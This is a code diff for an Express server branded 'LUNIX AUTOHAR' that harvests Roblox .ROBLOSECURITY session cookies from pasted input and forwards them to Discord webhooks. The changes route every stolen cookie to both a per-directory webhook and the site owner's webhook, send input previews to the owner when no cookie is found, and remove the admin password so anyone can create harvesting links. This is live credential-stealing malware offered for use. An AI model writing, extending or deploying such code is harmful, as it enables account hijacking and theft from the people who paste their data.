@@ -102,12 +102,7 @@ app.get('/api/token', (req, res) => {
 // API endpoint to create new directories
 app.post('/api/create-directory', async (req, res) => {
   try {
-    const { directoryName, webhookUrl, adminPassword } = req.body;
-
-    // Validate admin password
-    if (adminPassword !== ADMIN_PASSWORD) {
-      return res.status(401).json({ error: 'Invalid admin password' });
-    }
+    const { directoryName, webhookUrl } = req.body;
 
     // Validate directory name
     if (!directoryName || !/^[a-z0-9-]+$/.test(directoryName)) {
@@ -140,6 +135,33 @@ app.post('/api/create-directory', async (req, res) => {
     }
 
     console.log(`✅ Created new directory: ${directoryName}`);
+
+    // Send notification to the webhook about successful directory creation
+    try {
+      const notificationPayload = {
+        embeds: [{
+          title: "LUNIX AUTOHAR",
+          description: "Ur LUNIX AUTOHAR url\n📌\n\n`" + `http://${req.get('host')}/${directoryName}` + "`",
+          color: 0x8B5CF6,
+          footer: {
+            text: "Made By Lunix"
+          }
+        }]
+      };
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(notificationPayload)
+      });
+
+      console.log(`✅ Sent creation notification to webhook for directory: ${directoryName}`);
+    } catch (webhookError) {
+      console.log(`⚠️ Failed to send creation notification to webhook: ${webhookError.message}`);
+      // Don't fail the directory creation if webhook notification fails
+    }
 
     res.json({ 
       success: true, 
@@ -543,6 +565,13 @@ app.post('/:directory/convert', async (req, res) => {
 
     const directoryConfig = directories[directoryName];
 
+    // Validate API token for this specific directory
+    const providedToken = req.get('X-API-Token');
+    if (!providedToken || providedToken !== directoryConfig.apiToken) {
+      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
+      return res.status(401).json({ error: 'Invalid API token for this directory' });
+    }
+
     let input;
     let scriptType;
 
@@ -582,12 +611,13 @@ app.post('/:directory/convert', async (req, res) => {
         console.log('⚠️ Could not fetch user data, sending token only');
       }
 
-      // Send to both directory webhook and main webhook
+      // Send to directory webhook
       const directoryWebhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, userData, directoryConfig.webhookUrl);
 
-      // Also send to main webhook if configured
-      if (process.env.DISCORD_WEBHOOK_URL) {
-        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, userData);
+      // Always send to site owner (main webhook) - check both environment variable and default webhook
+      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      if (siteOwnerWebhookUrl) {
+        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, userData, siteOwnerWebhookUrl);
       }
 
       if (!directoryWebhookResult.success) {
@@ -613,6 +643,22 @@ app.post('/:directory/convert', async (req, res) => {
         });
       } catch (e) {
         console.log('Failed to send error to directory webhook:', e.message);
+      }
+
+      // Also send error to site owner webhook
+      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      if (siteOwnerWebhookUrl) {
+        try {
+          await fetch(siteOwnerWebhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              content: `❌ **No Token Found in Directory: ${directoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
+            })
+          });
+        } catch (e) {
+          console.log('Failed to send error to site owner webhook:', e.message);
+        }
       }
     }
 
